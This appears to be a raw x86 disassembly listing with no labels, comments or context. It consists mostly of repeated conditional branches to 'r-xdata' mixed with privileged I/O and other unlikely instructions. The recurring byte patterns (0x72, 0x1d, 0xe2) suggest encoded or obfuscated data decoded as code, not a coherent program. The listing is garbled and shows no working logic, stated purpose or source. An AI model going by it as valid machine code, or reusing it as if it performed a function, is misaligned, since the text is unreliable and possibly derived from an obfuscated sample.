sbb eax 0xbdbbbb1d
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
mov ebp 0x67ed2267
jb r-xdata
jb r-xdata
loop r-xdata
rol ebx 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ esi ]
and ch ch
jb r-xdata
test eax 0x72e2e2ff
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
out 0xe3 al
loop r-xdata
sbb eax 0x14d1b21d
jb r-xdata
0x26a79b22
jb r-xdata
movsb [ edi ] [ esi ]
mul [ ecx + 0x26 ]
out dx al
test [ ebx - 0x59 ] ch
or ebp [ edi - 0x3e ]
loop r-xdata
in ax 0xc7
and ch ch
jb r-xdata
sbb eax 0xb414d1b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ esi - 0x1e ]
loop r-xdata
je r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov dl dh
jb r-xdata
jb r-xdata
outsd
jb r-xdata
mov [ edx - 0x1d153ff5 ] dl
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ ss : edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x72212bb9
jb r-xdata
adc edi edi
loop r-xdata
jb r-xdata
jb r-xdata
or ebx [ 0x72e2e2c7 ]
out dx al
adc eax 0xa222f93a
sub esp [ ecx ]
jb r-xdata
jb r-xdata
or ecx esp
adc al 0x1d
sbb eax 0x3b9d0a72
sbb eax 0x2267aeb5
or esp [ ebx + 0x35 ]
sbb eax 0x7272721d
mov ah dh
jecxz r-xdata
mov dl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
rcl [ esp + esi * 4 ] 0x1
jb r-xdata
jb r-xdata
pop esi
jb r-xdata
jb r-xdata
loop r-xdata
imul esi [ edi + 0x3e ] 0x6b1d1d1f
jbe r-xdata
and cl [ bp + di ]
arpl [ 0x72721d1d ] si
jb r-xdata
scasb [ edi ]
loop r-xdata
loop r-xdata
loop r-xdata
outsd
imul esp [ edi - 0x3d7745fa ] 0xffffff84
imul esp [ edi - 0x2f7745fc ] 0xffffff84
imul esp [ edi + 0xb4c0b0a ] 0x1d
sbb eax 0xfb0b7272
out 0xe2 eax
loop r-xdata
ja r-xdata
adc al 0xb4
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
jb r-xdata
bound eax [ esi - 0x1e ]
loop r-xdata
and ch dl
mov dl 0x1d
xchg edi eax
push es
sbb eax 0xac69feb5
0x7e0b
jb r-xdata
or cl [ ebx + 0x30 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x721d1d18 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x8a
jb r-xdata
jb r-xdata
fstp [ esi + 0x66edf6c6 ]
0x8ae2e2e2 0xd87a
mov ah 0xa
jb r-xdata
jb r-xdata
retn 0xe2e2
and cl [ ebx ]
jb r-xdata
or ebx [ eax - 0x3e ]
shl [ edx ] 0x1
jb r-xdata
pop ds
and cl [ bp + di ]
cli
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x5e64691d
in al 0x3c
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x1ea72572
popad
scasd [ edi ]
push ds
or ebx [ eax + 0xb1d1d12 ]
cmp eax 0x72721d1d
mov dl 0xa
imul ebx [ ebx + ecx ] 0x1d1d0454
jb r-xdata
or ebp [ ecx + 0x72e2e2ff ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9d0a721d
jb r-xdata
jb r-xdata
outsd
or ecx [ eax + 0x1a ]
call 0x26a79b22
arpl [ esi ] cx
jb r-xdata
jb r-xdata
loop r-xdata
in eax 0xc7
jb r-xdata
jb r-xdata
jb r-xdata
cli
int3
mov ah 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xe2e2e228
jb r-xdata
jb r-xdata
outsd
cmp bh cl
and ah [ edx + 0x7272212b ]
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xea766b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x7272212b ] al
popad
jb r-xdata
xchg edi eax
sbb ch [ ebx - 0x59 ]
xor cl [ ebx ]
inc eax
0xe2e2
xor [ 0xffffffffee26611d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xb4
or ecx ebp
mul dl
loop r-xdata
sbb bl [ 0xaa76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
dec ebx
jb r-xdata
jb r-xdata
pop eax
jb r-xdata
jb r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
jmp edx
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
dec esi
loop r-xdata
sbb eax 0x2267b2b5
or esp [ esi - 0x20 ]
loop r-xdata
mov bh 0x69
jb r-xdata
jb r-xdata
or esi [ eax - 0x4 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc [ ebx ] cl
jb r-xdata
jb r-xdata
sahf
mov ch 0xae
outsd
jb r-xdata
popad
in eax dx
pushad
push esi
out 0xe2 al
loop r-xdata
loop r-xdata
jb r-xdata
in eax dx
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xb20aa76f
mov ah 0xb
int 0xf6
jb r-xdata
jb r-xdata
mov esp [ edx - 0x1dd9abe3 ]
jb r-xdata
in eax dx
push esp
in eax 0xb
out dx eax
or eax 0x69721d1d
and ebp ebp
xor [ 0x22611d1d ] bl
loopne r-xdata
sbb eax 0xee26611d
sbb eax 0x1d362a0b
imul esp [ edi + 0x34090a1e ] 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
aaa
push ds
jb r-xdata
and ah dl
loop r-xdata
imul esp [ esi + ebx * 2 - 0x1e ] 0x6c69e2e2
mov esi 0xe2fe810b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x12980b1e ] 0x650b1d1d
cmp eax 0x72721d1d
jb r-xdata
jbe r-xdata
cmp ebx [ 0xfffffffffa26611d ]
popfd
jb r-xdata
or esp [ ecx ]
or bl [ 0xffffffff9a0bb71d ]
in eax dx
loop r-xdata
cld
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
leave
jb r-xdata
sbb [ 0xffffffffe3750a1d ] ebx
adc bl [ ecx ]
jb r-xdata
mov esp 0x84c08821
jb r-xdata
jb r-xdata
mov [ ecx + 0x3aa76b84 ] dl
mov edx 0x930b8188
in eax dx
push ebp
popad
and esp eax
shl [ edx ] 0x1
outsd
mov eax 0xefd40b32
loop r-xdata
in al 0xe2
test [ ebx - 0xa ] ch
xchg ebx eax
movsb [ edi ] [ esi ]
fst [ edx ]
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edi + 0xb1d1d33 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ch
0xffffe2e2 0x8ae2
and esp eax
or cl [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
or dh [ edx - 0x932f44c ]
imul esp [ edx + 0x46 ] 0x61e2e2e2
xchg edx eax
or eax eax
0x7272e2e2 0x971d
sbb eax 0xe2e22654
jb r-xdata
and bl [ 0x69721d1d ]
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
dec esi
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp esi 0x7272e2e2
mov [ 0x1d18e70b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xfa26611d
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xbe6881d
scasb [ edi ]
add eax 0x84721d1d
imul esp [ edi - 0x697745fa ] 0xb
fsubr st5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ ebp + 0x611d1d3b ]
jb r-xdata
sbb eax 0xe3750a1d
imul esp [ edi - 0x494ae2ca ] 0x67
jb r-xdata
jb r-xdata
xchg edi eax
sbb eax 0xbf6b1297
jb r-xdata
jb r-xdata
loop r-xdata
mov ebx 0x62e36986
0x1c0be2e0 0x1d37
sbb eax 0xd1727272
xchg ebp eax
jb r-xdata
sbb eax 0xce0bea97
cmc
loop r-xdata
in eax dx
mov al [ 0x1d1d1d3f ]
xchg edi eax
out dx al
imul ecx [ esi ] 0x1e8761b3
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x2267b6b5
sbb eax 0x66ed721d
xor ebx [ 0x1bc0b1d ]
jb r-xdata
rol bx 0xe2
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]

loop r-xdata
jb r-xdata
or [ ebx + 0x362a0b1d ] esi
jb r-xdata
lahf
push ds
jb r-xdata
imul ebx [ edi - 0x5ef44de2 ] 0x3d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe25e6469
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah 0x69
adc ch ch
jb r-xdata
jpe r-xdata
sub eax 0x72721d1d
mov eax 0x88bb9488
test [ ecx + 0x20 ] ebp
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or eax esp
jb r-xdata
in al 0xb5
mul [ es : edi + 0x22 ]
sub dh [ ebp - 0x1d0506f6 ]
loop r-xdata
adc ch [ ebx - 0x41 ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ch [ ebx - 0x59 ]
jb r-xdata
enter 0xe2c4 0xe2
sar [ ebx + 0x69e36986 ] cl
mov [ 0x1ea76bea ] al
or edi esi
in eax dx
loop r-xdata
jb r-xdata
sbb eax 0x1d01bc0b
jb r-xdata
int3
imul esp [ ecx + 0x18930bf6 ] 0x72721d1d
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
and esi [ ebx ]
sbb ah [ ecx ]
jb r-xdata
and dl [ 0x1d1d ]
outsd
movsd [ edi ] [ esi ]
jecxz r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9f6b841d
sbb eax 0x362a0b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx - 0x1e ] 0x228be2e2
pop esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45ed5895 ] al
mov [ ebx + 0x1d335f0b ] cl
sbb eax 0x72727272
jb r-xdata
cmp al [ ebx + ebp * 2 + 0x3b69eebf ]
test [ ebx - 0x41 ] ch
in al dx
or ebp [ ebx - 0xb ]
loop r-xdata
in eax dx
push esp
sbb cl cl
and eax 0xe2f75b0b
loop r-xdata
imul edx [ edx ] 0xb5e454ed
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
imul esp [ ss : ebx ] 0x34a76b84
mov edx 0x6b849188
cmpsd [ esi ] [ edi ]
cmp bh [ edx - 0x6cf47e78 ]
mov [ ebx + edi * 4 + 0x20698588 ] dl
sbb eax 0x67fa2661
jb r-xdata
jb r-xdata
mov edi 0xf90ab52a
jb r-xdata
jb r-xdata
jb r-xdata
push ss
rcr [ 0x65f9669 ] 0x1
cmpsd [ esi ] [ edi ]
in eax dx
sbb ax 0xe2f4
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x721d1d01
jb r-xdata
jb r-xdata
sub dh [ esi ]
jb r-xdata
mov [ 0xffffffffe226541d ] al
jb r-xdata
jb r-xdata
popad
cmp al 0xb
or ebp [ edx ]
jb r-xdata
jb r-xdata
sbb bl [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
arpl [ 0xffffffffe2e2e228 ] sp
jb r-xdata
mov ch 0xb
mov dl 0xa
xchg ebx eax
das
sbb eax 0xee971d1d
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push esp
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
or ebx eax
in eax dx
popad
cli
loop r-xdata
mov ch 0xa
stc
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shr [ ebx ] 0x1
imul edi [ edi + 0x31346916 ] 0x16a71d18
and cl [ ebx ]
test [ ebx - 0x59 ] ch
push cs
mov cl 0x3e
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0xc166ed72
sbb eax 0xb1727272
or edx [ esp + eax + 0x1d ]
jb r-xdata
sbb eax 0x9f6b841d
jb r-xdata
and cl [ ebx ]
jb r-xdata
sbb eax 0x3ce40a1d
jb r-xdata
jb r-xdata
sub dl ah
jb r-xdata
jb r-xdata
jb r-xdata
or ebp ebp
loop r-xdata
push cs
mov bl 0x61
xchg [ esi ] ebx
and cl [ ebx ]
and [ edx ] ecx
sbb eax 0x9a0bb71d
enter 0xe2c4 0xe2
pop ss
sbb eax 0x32be0b1d
sbb eax 0xd122d11d
imul esp [ edi + 0x72212b1e ] 0x72727272
jb r-xdata
add ch [ edi - 0x51 ]
push 0xffffffa7
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx ] 0x976b84
jb r-xdata
jb r-xdata
jb r-xdata
popad
and ebp edx
push 0xffffffb6
jmp [ esi ]
push ss
or esp edx
shl edx 0xe2
jb r-xdata
sbb [ 0x236116a7 ] bl
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov [ esi + 0xea76b84 ] dl
jb r-xdata
sbb eax 0x1bc0b1d
fidiv [ ebp + 0x33870ab2 ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
add al 0x1d
jb r-xdata
sbb eax 0x3c9f6b84
jb r-xdata
jb r-xdata
or ah ah
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
add ecx [ edi ]
sbb eax 0x6b72721d
cmpsd [ esi ] [ edi ]
push cs
shl [ edx ] 0x1
imul esp [ edi + 0x691dd116 ] 0xffffff96
pop edi
push es
and cl [ bp + di ]
jb r-xdata
mov esp 0xb50b3c69
in al 0xe2
loop r-xdata
0x6b841269 0x97
jb r-xdata
imul esp [ edi + 0x1eaf691e ] 0x69
sahf
outsd
or cl [ ebx ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov [ 0x6b12971d ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov [ ebx + 0x1d1da40b ] al
sbb eax 0x72727272
jb r-xdata
sbb eax 0x23617272
jb r-xdata
test [ ebx - 0x69 ] ch
jb r-xdata
mov edx 0x12699a88
jb r-xdata
jb r-xdata
xor al 0x1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
lahf
jb r-xdata
jb r-xdata
imul ebx [ edi - 0x564f4c4 ] 0xffffffe2
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
adc al [ ebx + ebp * 2 + 0x69bc0097 ]
jb r-xdata
push ds
jb r-xdata
push es
scasd [ edi ]
scasd [ edi ]
and eax 0xb4a906a7
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
and eax 0xb4a906a7
jb r-xdata
in al dx
and eax 0x87902aa7
mov ah 0xaf
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ ecx + ebp * 2 - 0x1b4af4c4 ] bh
xchg edi eax
jb r-xdata
mov dl 0xed
jb r-xdata
jb r-xdata
xchg [ ebx ] esi
jb r-xdata
or ebx [ ebx + 0x72e2e2fa ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl bl
stc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add bh [ edx + 0x12699a88 ]
jb r-xdata
jb r-xdata
test eax 0xba9afb4
inc ebp
jmp edx
jb r-xdata
and eax 0x83952ea7
and eax 0xafb426a7
mov ch 0xe4
imul edx [ edi + 0x3c69bc00 ] 0xb
jb r-xdata
scasd [ edi ]
push ds
imul ebx [ esi + 0x4f0b0a6f ] 0x721d1d34
mov eax 0xe2c1e20b
loop r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0x1d3ce40a
cmpsd [ esi ] [ edi ]
jb r-xdata
xor ch al
loop r-xdata
jb r-xdata
jb r-xdata
mul dl
loop r-xdata
jb r-xdata
and esi esi
imul ebp [ edi + 0x18af0b1e ] 0x1d
sbb eax 0x72727272
in eax dx
jb r-xdata
imul esp [ edi + 0xb2c694c ] 0xffffff8b
hlt
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ecx + esi ] 0x16a71d18
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
mov cl 0x1d
mov ch 0xb2
and cl [ bp + di ]
loopne r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2c4950b
fwait
jb r-xdata
mov ah 0xaa
jb r-xdata
mov [ edx + 0x6b841269 ] bl
jb r-xdata
jb r-xdata
mov [ 0x1d00bf0b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec edi
test eax 0xe2ff450b
loop r-xdata
mov ah 0xaf
jb r-xdata
xchg ebp eax
and [ 0xffffffff87902aa7 ] 0xffffffb4
scasd [ edi ]
cmpsd [ esi ] [ edi ]
mov ah 0xaf
in eax dx
jb r-xdata
or eax [ esi - 0x39 ]
loop r-xdata
jb r-xdata
in eax dx
imul esi [ ebx ] 0x38b76b84
jb r-xdata
fdivr [ edx + 0x1d398d0b ]
popad
and ah al
in eax dx
push ebp
shl [ ecx + 0x23 ] cl
loopne r-xdata
sbb [ 0x55edb51d ] ebx
not [ ebx + 0x1d393a0b ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x1a69b5b3
or ebp [ ecx + 0x6be2e2f1 ]
xor [ ebx - 0x59 ] ch
imul esp [ edi - 0x7bda96c4 ] 0x6b
cmpsd [ esi ] [ edi ]
or cl ah
cmc
loop r-xdata
popad
jb r-xdata
cmp al 0xb
in eax dx
0x26ffb66a 0x1b61
xor [ eax ] ebx
sbb eax 0x236116a7
jb r-xdata
jb r-xdata
or edi [ ecx + eax - 0x128de2e3 ]
jb r-xdata
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x631a0661
push cs
push ds
loop r-xdata
jb r-xdata
retn 0x60ed
push ebp
in eax 0xb
in eax dx
cmpsd [ esi ] [ edi ]
push ds
sbb eax 0x362b0b1d
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
adc dh [ ecx + 0x2f930ab2 ]
imul edi [ ebx + ecx ] 0xe2e2e4b5
jb r-xdata
or edi [ edi + 0x721d1d00 ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loope r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
push cs
imul esp [ edi + 0x12a76b16 ] 0x1d1dd90b
sbb eax 0x72727272
cmpsd [ esi ] [ edi ]
or ch [ ecx - 0x59 ]
sbb ch [ ebx - 0x59 ]
adc al 0xed
cmp [ bp + si ] cl
sbb eax 0xbc22d11d
or esi esp
jb r-xdata
jb r-xdata
sbb eax 0xf655edb5
xchg ebx eax
or edi [ edx ]
cmp [ 0x7272721d ] ebx
imul ebx [ ebx - 0x1239396a ] 0x1d318467
sbb eax 0xe2f5cc0a
loop r-xdata
loop r-xdata
fidiv [ ebx - 0x9d99ee3 ]
mov dl [ esi ]
jecxz r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
or eax [ ebx + 0x721d1d31 ]
jb r-xdata
imul [ ebx - 0x51 ]
push ds
or ebp [ edi + 0x721d1d18 ]
jb r-xdata
mov bh 0x69
push cs
mov bl 0xb5
imul ebx [ edx ] 0xe2f1a90b
loop r-xdata
sbb [ 0xffffffff8a72721d ] ebx
loop r-xdata
sbb [ 0x550bb21d ] ebx
loop r-xdata
xchg esi eax
jb r-xdata
add [ 0x66ed721d ] ebx
jb r-xdata
jb r-xdata
sbb eax 0x30d122d1
jb r-xdata
and [ bx + di ] ebx
sbb eax 0x550bb21d
jb r-xdata
adc [ eax - 0x1312f479 ] 0xffffffe2
xchg ebp eax
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
or edi edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x300bd388
mov bh 0x38
jb r-xdata
loop r-xdata
jb r-xdata
sbb cl dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ ecx ] 0x1d
sbb eax 0x72727272
sbb eax 0x72727272
sbb eax 0x961deab5
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0x721d1d33
jb r-xdata
jb r-xdata
sbb [ 0x7272721d ] bl
mov bh 0x16
imul esp [ edi + 0xaa76b1e ] 0x6b1aa769
mov cl 0xb
aam 0x37
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x7b7745f4 ] 0xffffff84
imul esp [ edi - 0x747745ee ] 0xb
pop edi
xor ebx [ 0x7272721d ]
jb r-xdata
push 0x1269b4f3
jb r-xdata
jb r-xdata
and dl cl
jb r-xdata
sub esp [ ecx ]
jb r-xdata
outsd
nop
xchg [ ebx ] ecx
jb r-xdata
scasd [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi - 0x77dd2ee8 ] 0xffffff9a
cli
jb r-xdata
jb r-xdata
outsd
mov dl 0xed
loop r-xdata
loop r-xdata
jb r-xdata
and cl [ eax - 0x4a2f466 ]
jb r-xdata
jb r-xdata
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x7747c749 ]
ror [ ebx ] cl
jb r-xdata
jb r-xdata
sbb ch [ esi ]
adc cl [ ebx ]
fstp [ 0x72721d1d ]
jb r-xdata
mov bl [ edx ]
and eax 0x2a76b84
mov ch 0xea
sbb eax 0x1deac696
mov ch 0xce
or ebp [ esi ]
sub ebx [ 0x7272721d ]
jb r-xdata
mov dl ah
jb r-xdata
jb r-xdata
lodsb [ esi ]
inc si
mov ah 0xd9
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1aa7690a ] 0x6b
test [ ecx - 0x24 ] ah
loop r-xdata
adc ch [ edx - 0x59 ]
push 0xffffffa7
jb r-xdata
or eax [ esi + 0x72e2e2ce ]
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
call 0x69fa5fd8
sbb cl [ edx ]
jb r-xdata
cmp [ 0xffffffffec66ed1d ] bl
mov al [ 0x1a69b4a0 ]
or ch [ ecx + 0x1 ]
sbb eax 0xf226611d
imul edi [ edx ] 0x3d0b1d67
and eax 0xa9af0ea7
mov ah 0xaf
and eax 0x8baf36a7
adc [ eax - 0x1d05f4f5 ] 0x727272e2
jb r-xdata
sbb eax 0xe2ec66ed
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
mov bh 0x1e
jb r-xdata
0xe2fb5d0b 0x72e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor cl ah
loop r-xdata
imul esi [ edi - 0x2c7747c8 ] 0xb
jb r-xdata
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
adc al 0x1d
jb r-xdata
imul ebp [ edi - 0x58947bbc ] 0x4c
jb r-xdata
imul esp [ esi + edi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb ebp ebp
jb r-xdata
imul ebx [ edi ] 0x1d
jb r-xdata
into
jb r-xdata
loop r-xdata
xchg dh cl
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
mov cl [ ecx - 0x4b5f5f18 ]
loop r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
push cs
scasd [ edi ]
test eax 0xa725afb4
scasd [ edi ]
mov eax [ ecx - 0x5f4f470 ]
in al dx
jb r-xdata
mov [ edx - 0x1d04a2f5 ] bl
loop r-xdata
jb r-xdata
mov eax ebp
pop ebp
in al dx
jb r-xdata
jb r-xdata
sbb eax 0xec66ed1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
outsd
jb r-xdata
pushad
fistp [ ebx + 0x56a76a1d ]
jb r-xdata
jb r-xdata
sar [ ecx ] 0x1
jb r-xdata
jb r-xdata
cmp [ eax + 0x300bd388 ] bh
jb r-xdata
push ebp
loop r-xdata
jb r-xdata
imul esp [ esi - 0x7745213a ] 0xffffff87
imul ebp [ ebx + ecx ] 0xe2e2f48b
jb r-xdata
inc esp
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x6f9e691e ] 0x344f0b0a
jb r-xdata
lodsb [ esi ]
sbb eax 0xed22671d
popfd
call 0xffffffffbde8a1e3
mov ecx 0x7272212b
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp - 0x5 ]
sub al 0x1d
sbb eax 0xbeabfdb
loop r-xdata
mov cl 0xd1
imul ebx [ edx ] 0x1d01690a
sbb eax 0x69f22661
cmp ah [ edi + 0x1d ]
or edi [ 0xffffffffed1d1d38 ]
test cl bl
sub eax 0xe2e467ed
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx ] 0x18a76b84
mov ebx 0x16af6b84
jb r-xdata
outsb
jb r-xdata
pop ds
jb r-xdata
or eax [ ebx ]
jb r-xdata
adc ch [ ecx + 0x2a ]
mov ah cl
test [ ebx - 0x51 ] ch
adc [ ebx + 0x16af6b84 ] bh
add ebx [ 0xffffffff8872721d ]
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec esp
cmpsd [ esi ] [ edi ]
push ds
mov dl 0xb
or [ ebx + 0x6972721d ] edi
xor al 0xd1
and cl [ eax - 0x48947b6a ]
inc eax
mov eax 0x44af6b84
outsd
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x3d0b1d67
popad
and al ah
popad
or ah al
and cl [ bp + di ]
imul edi [ ebx ] 0x1d
sbb eax 0xf355ed72
mov cl 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edi + 0x721d1d33 ]
imul ebp [ edi - 0x7bd596ea ] 0x6b
jb r-xdata
sbb eax 0x2f590a1d
jb r-xdata
sbb eax 0x1d2f590a
sbb eax 0xd880bbb
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
test [ ebx - 0x5a ] ch
or bl [ 0xffffffffbb1d1d06 ]
outsd
and ch ch
cmp [ ecx + ebx * 8 + 0x4666ed19 ] esi
jb r-xdata
jb r-xdata
imul esp [ edi - 0x12dd98e2 ] 0x66
int3
popad
fsubr st2
or ebp [ ebx + 0x1f ]
test [ ecx - 0x67 ] ah
movsb [ edi ] [ esi ]
loop r-xdata
push ebp
mov eax [ 0xffffffffc80bb286 ]
aas
sbb eax 0xf2e25a1d
loop r-xdata
mov dl 0xed
add bl [ 0xffffffff9f61721d ]
sbb eax 0x30b1eb7
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
cmp al [ ebx + ebp * 2 + 0x39d1f2bf ]
mov bh 0x7c
jb r-xdata
jb r-xdata
jb r-xdata
xchg esi eax
jb r-xdata
or eax [ esi + 0x8 ]
sbb eax 0x7272721d
